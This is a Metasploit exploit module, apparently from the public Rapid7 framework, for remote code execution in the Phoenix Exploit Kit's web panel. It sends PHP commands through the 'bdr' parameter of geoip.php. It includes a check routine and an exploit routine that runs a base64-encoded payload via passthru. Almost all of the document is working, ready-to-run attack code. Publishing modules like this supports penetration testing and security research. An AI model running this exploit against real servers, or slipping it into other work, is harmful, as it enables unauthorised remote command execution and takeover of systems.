##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Phoenix Exploit Kit Remote Code Execution',
      'Description'    => %q{
        This module exploits a Remote Code Execution in the web panel of Phoenix Exploit Kit via the geoip.php. The
        Phoenix Exploit Kit is a popular commercial crimeware tool that probes the browser of the visitor for the
        presence of outdated and insecure versions of browser plugins like Java, and Adobe Flash and Reader which
        then silently installs malware.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'CrashBandicot @DosPerl', #initial discovery
          'Jay Turla <@shipcod3>', #msf module
        ],
      'References'     =>
        [
          [ 'EDB', '40047' ],
          [ 'URL', 'http://krebsonsecurity.com/tag/phoenix-exploit-kit/' ], # description of Phoenix Exploit Kit
          [ 'URL', 'https://www.pwnmalw.re/Exploit%20Pack/phoenix' ],
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'    => 200,
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd'
            }
        },
      'Platform'       => %w{ unix win },
      'Arch'           => ARCH_CMD,
      'Targets'        =>
        [
          ['Phoenix Exploit Kit / Unix', { 'Platform' => 'unix' } ],
          ['Phoenix Exploit Kit / Windows', { 'Platform' => 'win' } ]
        ],
      'DisclosureDate' => 'Jul 01 2016',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path of geoip.php which is vulnerable to RCE', '/Phoenix/includes/geoip.php']),
      ],self.class)
  end

  def check
    test = Rex::Text.rand_text_alpha(8)
    res = http_send_command("echo #{test};")
    if res && res.body.include?(test)
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end

  def exploit
    encoded = Rex::Text.encode_base64(payload.encoded)
    http_send_command("passthru(base64_decode(\"#{encoded}\"));")
  end

  def http_send_command(cmd)
    send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path),
      'vars_get' => {
        'bdr' => cmd
      }
    })
  end
end
